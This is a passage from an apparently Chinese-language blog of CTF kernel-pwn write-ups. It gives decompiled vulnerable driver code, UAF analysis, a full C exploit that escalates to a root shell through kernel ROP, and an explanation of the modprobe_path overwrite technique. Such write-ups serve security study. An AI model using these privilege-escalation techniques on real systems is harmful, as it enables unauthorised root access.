class="line">  _check_object_size(v7, v12, <span class="number">0LL</span>);</span><br><span class="line">  v11 = copy_from_user(v8, v10, v9);</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( addrList[v11] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v11 == <span class="number">0x20</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  addrList[(<span class="type">int</span>)v11] = v8;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>学了一段时间内核，发现这一道题是真的简单，瞬间秒了。明显的<code>UAF</code>漏洞，直接用<code>seq</code>泄露出内核地址，然后配合<code>rt_regs</code>栈迁移打内核<code>rop</code></p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> seq_op = <span class="number">0xffffffff81319d30</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00f30</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi = <span class="number">0xffffffff81089250</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82663300</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c8d40</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_xx = <span class="number">0xffffffff817800c6</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span>  idx;</span><br><span class="line">    <span class="type">size_t</span>  size;</span><br><span class="line">    <span class="type">void</span>    *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">add_chunk</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span>  size;</span><br><span class="line">    <span class="type">void</span>    *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ker_fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span> <span class="title">op</span> =</span> &#123;.idx = idx,.size = size,.buf = buf&#125;;</span><br><span class="line">    ioctl(ker_fd, <span class="number">0x40</span>, &amp;op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span> <span class="title">op</span> =</span> &#123;.idx = idx,.size = size,.buf = buf&#125;;</span><br><span class="line">    ioctl(ker_fd, <span class="number">0x50</span>, &amp;op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">op_chunk</span> <span class="title">op</span> =</span> &#123;.idx = idx,&#125;;</span><br><span class="line">    ioctl(ker_fd, <span class="number">0x30</span>, &amp;op);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">size_t</span> size, <span class="type">void</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">add_chunk</span> <span class="title">add</span> =</span> &#123;.size = size,.buf = buf,&#125;;</span><br><span class="line">    ioctl(ker_fd, <span class="number">0x20</span>, &amp;add);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"><span class="type">size_t</span> a;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ker_fd = open(<span class="string">&quot;/dev/kerpwn&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(ker_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open kerpwn&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x20</span>, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(seq_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open /proc/self/stat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    show(<span class="number">0</span>, <span class="number">0x20</span>, buf);</span><br><span class="line">    binary_dump(<span class="string">&quot;seq&quot;</span>, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    kernel_offset = buf[<span class="number">0</span>] - seq_op;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">9</span>;</span><br><span class="line">    pop_rdi += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    add_rsp_xx += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_xx&quot;</span>, add_rsp_xx);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = add_rsp_xx;</span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x8</span>,buf);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;begin to get shell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov r15,  0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,  pop_rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,  init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,  commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,  swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,  0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,  0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,  0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,   0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,   0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,  rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,  0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,  8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,  rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,  seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RWCTF2022高校赛-Digging-into-kernel-1-2"><a href="#RWCTF2022高校赛-Digging-into-kernel-1-2" class="headerlink" title="[RWCTF2022高校赛] Digging into kernel 1 &amp; 2"></a>[RWCTF2022高校赛] Digging into kernel 1 &amp; 2</h2><h3 id="关键代码-1"><a href="#关键代码-1" class="headerlink" title="关键代码"></a>关键代码</h3><h4 id="xkmod-ioctl"><a href="#xkmod-ioctl" class="headerlink" title="xkmod_ioctl"></a>xkmod_ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">xkmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  copy_from_user(&amp;v4, a3, <span class="number">0x10</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0x6666666</span> )                        <span class="comment">// edit</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf &amp;&amp; v6 &lt;= <span class="number">0x50</span> &amp;&amp; v5 &lt;= <span class="number">0x70</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      copy_from_user((<span class="type">char</span> *)buf + (<span class="type">int</span>)v5, v4, (<span class="type">int</span>)v6);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x7777777</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x1111111</span> )                    <span class="comment">// add</span></span><br><span class="line">        buf = (<span class="type">void</span> *)kmem_cache_alloc(s, <span class="number">0xCC0</span>LL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf &amp;&amp; v6 &lt;= <span class="number">0x50</span> &amp;&amp; v5 &lt;= <span class="number">0x70</span> )      <span class="comment">// show</span></span><br><span class="line">    &#123;</span><br><span class="line">      copy_to_user(v4, (<span class="type">char</span> *)buf + (<span class="type">int</span>)v5);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))xkmod_ioctl_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="xkmod-release"><a href="#xkmod-release" class="headerlink" title="xkmod_release"></a>xkmod_release</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">xkmod_release</span><span class="params">(inode *inode, file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> kmem_cache_free(s, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这题的漏洞是显而易见的，和<code>CISCN-2017 babydrive</code>一模一样，即<code>release</code>将<code>buf</code>释放后没有将<code>buf</code>指针置零，我们可以创建多个<code>fd</code>来利用该<code>UAF</code>漏洞。由于前面的题目都是用<code>kernel rop</code>来解决的，所以这一题我尝试使用<code>modprobe_path</code>来进行求解<br>首先我们要知道<code>modprobe_path</code>是什么东西。根据维基百科的说法，<code>modprobe</code>是最初由<code>Rusty Russell</code>编写的<code>Linux</code>程序，用于在<code>Linux</code>内核中添加可加载的内核模块。实际上，当我们在<code>Linux</code>内核中安装或卸载新模块时，就会执行这个程序。当我们执行具有未知文件类型的文件时，将执行存储在<code>modprobe_path</code>路径的程序。更准确地说，如果我们针对系统未知文件签名（魔术头）的文件调用<code>execve()</code>，则会产生以下调用  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() // wrapped as request_module</span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure><p>最终会调用<code>call_modprobe()</code>，该函数会有如下操作：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">      argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">      argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">      argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">      argv[<span class="number">3</span>] = module_name;</span><br><span class="line">      argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">                     <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们在系统上执行文件类型未知的文件时，系统将会执行当前路径存储在<code>modprobe_path</code>中的任何文件。因此，我们所研究的技术就是使用任意写入原语，将<code>modprobe_path</code>覆盖到我们自己编写的<code>Shell</code>脚本的路径中，然后执行具有未知文件签名的虚拟文件。其结果将导致在系统仍处于内核模式时执行<code>Shell</code>脚本，从而导致<code>root</code>特权的任意代码执行。<br>所以我们的思路即为利用<code>UAF</code>漏洞，将被释放的<code>buf</code>的<code>next</code>指针改为指向<code>modprobe_path</code>，再利用<code>UAF</code>将<code>modprobe_path</code>修改为我们恶意脚本的路径，进而使我们能够以<code>root</code>权限来执行我们的恶意脚本，赋予<code>flag</code>能给普通用户读取的权限<br>在内核“堆基址”<code>（page_offset_base） + 0x9d000</code> 处存放着 <code>secondary_startup_64</code> 函数的地址，而我们可以从 <code>free object</code> 的 <code>next</code> 指针获得一个堆上地址，从而去猜测堆的基址，之后分配到一个 堆基址 <code>+ 0x9d000</code> 处的 <code>object</code> 以泄露内核基址，这个地址前面刚好有一片为 <code>NULL</code> 的区域方便我们分配  </p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 